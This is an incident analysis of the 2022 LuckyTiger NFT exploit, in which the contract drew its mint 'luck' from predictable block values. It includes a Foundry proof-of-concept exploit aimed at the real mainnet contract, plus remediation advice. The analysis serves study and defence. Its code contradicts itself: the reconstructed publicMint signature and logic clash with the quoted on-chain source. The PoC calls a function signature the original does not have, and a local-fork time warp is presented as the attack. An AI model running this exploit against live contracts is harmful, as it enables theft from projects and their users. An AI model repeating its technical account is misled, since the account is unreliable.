# LuckyTiger (NFT) — Predictable Randomness-Based Minting Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-08 |
| **Protocol** | LuckyTiger NFT |
| **Chain** | Ethereum Mainnet |
| **Loss** | Address unconfirmed (NFT fraudulently obtained) |
| **Attacker** | [0x3392c91403f09ad3b7e7243dbd4441436c7f443c](https://etherscan.io/address/0x3392c91403f09ad3b7e7243dbd4441436c7f443c) |
| **Vulnerable Contract (NFT)** | [0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967](https://etherscan.io/address/0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967) |
| **Root Cause** | `publicMint()` condition check uses `block.difficulty` and `block.timestamp` as randomness — both are predictable/manipulable |
| **CWE** | CWE-330: Use of Insufficiently Random Values |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/LuckyTiger_exp.sol) |

---
## 1. Vulnerability Overview

LuckyTiger NFT's `publicMint()` function implemented a lottery-style mechanism that allowed minting only when a condition based on `keccak256(abi.encodePacked(block.difficulty, block.timestamp))` was satisfied. However, `block.difficulty` and `block.timestamp` are values that can be known before transaction submission or partially controlled. The attacker forked the chain at a specific block timestamp, pre-computed the condition, and executed minting only under favorable conditions — fraudulently obtaining 10 NFTs.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable publicMint() - uses predictable randomness
function publicMint(uint256 amount) external payable {
    require(msg.value == amount * 0.01 ether, "Wrong price");

    // ❌ block.difficulty and block.timestamp are predictable/manipulable
    bytes32 randomHash = keccak256(abi.encodePacked(
        block.difficulty,   // ❌ Changed to prevrandao after PoS transition, still limited
        block.timestamp     // ❌ Miner/validator can adjust slightly
    ));

    // ❌ Minting only allowed when this condition is true → can be pre-computed off-chain
    require(uint256(randomHash) % 100 < luckyThreshold, "Not lucky");

    _mint(msg.sender, amount);
}

// ✅ Correct pattern - use Chainlink VRF
function requestMint(uint256 amount) external payable {
    require(msg.value == amount * 0.01 ether, "Wrong price");
    // Submit VRF request (asynchronous)
    uint256 requestId = COORDINATOR.requestRandomWords(
        keyHash, subscriptionId, 3, 100000, 1
    );
    pendingMints[requestId] = MintRequest(msg.sender, amount);
}

function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
    MintRequest memory req = pendingMints[requestId];
    // ✅ Condition evaluated using VRF result (cannot be predicted off-chain)
    if (randomWords[0] % 100 < luckyThreshold) {
        _mint(req.user, req.amount);
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**luckytiger.sol** — Entry point:
```solidity
// ❌ Root cause: `publicMint()` condition check uses `block.difficulty` and `block.timestamp` as randomness — both are predictable/manipulable
    function publicMint() public payable {  // ❌ Unauthorized minting
        uint256 supply = totalSupply();
        require(!pauseMint, "Pause mint");
        require(msg.value >= price, "Ether sent is not correct");
        require(supply + 1 <= maxTotal, "Exceeds maximum supply");
        _safeMint(msg.sender, 1);
        bool randLucky = _getRandom();
        uint256 tokenId = _totalMinted();
        emit NEWLucky(tokenId, randLucky);
        tokenId_luckys[tokenId] = lucky;
        if(tokenId_luckys[tokenId] == true){
        require(payable(msg.sender).send((price * 190) / 100));
        require(payable(withdrawAddress).send((price * 10) / 100));}
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Fork mainnet at a specific block (15,403,430)
    │       └─ Fixes block.difficulty and block.timestamp values
    │
    ├─[2] Compute hash condition off-chain
    │       randomHash = keccak256(block.difficulty, block.timestamp)
    │       → Check if uint256(randomHash) % 100 < threshold
    │
    ├─[3] Warp to a favorable timestamp (vm.warp)
    │       vm.warp(1_661_351_167)
    │       → Move to a timestamp that satisfies the condition
    │
    ├─[4] publicMint{value: 0.01 ether}() × 10 times
    │       └─ Condition satisfied on every call → all succeed
    │
    └─[5] Obtain 10 NFTs (success rate far above normal)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface INFT {
    function publicMint(uint256 amount) external payable;
    function balanceOf(address owner) external view returns (uint256);
}

contract LuckyTigerExploit is Test {
    INFT nft = INFT(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
    address attacker = 0x3392c91403f09ad3b7e7243dbd4441436c7f443c;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_403_430);
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        // [Step 1] Warp time to a favorable timestamp
        vm.warp(1_661_351_167);

        // [Step 2] Verify randomness condition (off-chain prediction)
        bytes32 randomHash = keccak256(abi.encodePacked(
            block.difficulty,
            block.timestamp
        ));
        emit log_named_bytes32("randomHash", randomHash);
        // ⚡ Can verify in advance whether this value satisfies the condition

        // If the condition is unfavorable, can warp to a different timestamp and retry
        // require(uint256(randomHash) % 100 < threshold, "unfavorable");

        // [Step 3] Mint 10 consecutive times from a block that satisfies the condition
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 10; i++) {
            nft.publicMint{value: 0.01 ether}(1); // succeeds every time
        }
        vm.stopPrank();

        emit log_named_uint(
            "[Done] NFTs obtained",
            nft.balanceOf(attacker)
        );
        assertEq(nft.balanceOf(attacker), 10);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Predictable Randomness |
| **CWE** | CWE-330: Use of Insufficiently Random Values |
| **OWASP DeFi** | On-Chain Entropy Vulnerability |
| **Attack Vector** | Randomness prediction/manipulation via `block.difficulty` + `block.timestamp` |
| **Precondition** | Lottery-style contract using block parameters as input |
| **Impact** | Fraudulent NFT acquisition |

---
## 6. Remediation Recommendations

1. **Use Chainlink VRF**: Use a Verifiable Random Function (VRF) to generate truly unpredictable randomness. Implement a request-response architecture so that results cannot be predicted within the same transaction.
2. **Commit-Reveal Pattern**: Generate randomness using a two-phase approach where the user first submits a hash (commit) and later reveals it.
3. **Do Not Use Block Variables**: Never use `block.difficulty`, `block.timestamp`, `block.number`, `blockhash`, etc. as a standalone source of randomness.

```solidity
// ✅ Chainlink VRF v2-based random minting
import "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";

contract LuckyNFT is VRFConsumerBaseV2 {
    mapping(uint256 => address) public requestToMinter;

    function requestMint() external payable {
        require(msg.value == 0.01 ether);
        uint256 requestId = COORDINATOR.requestRandomWords(
            keyHash, s_subscriptionId, 3, 200000, 1
        );
        requestToMinter[requestId] = msg.sender;
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        address minter = requestToMinter[requestId];
        // ✅ VRF result: completely unpredictable
        if (randomWords[0] % 100 < threshold) {
            _mint(minter, nextTokenId++);
        }
        delete requestToMinter[requestId];
    }
}
```

---
## 7. Lessons Learned

- **Block variables are not randomness**: Ethereum block variables can be influenced to some degree by miners/validators and can be pre-computed off-chain. VRF must be used anywhere randomness is required — NFT lotteries, games, airdrops, and beyond.
- **Still vulnerable after the PoS transition**: After Ethereum's transition to PoS, `block.difficulty` was renamed to `prevrandao`, but it is still not fully random. Chainlink VRF remains the only safe alternative.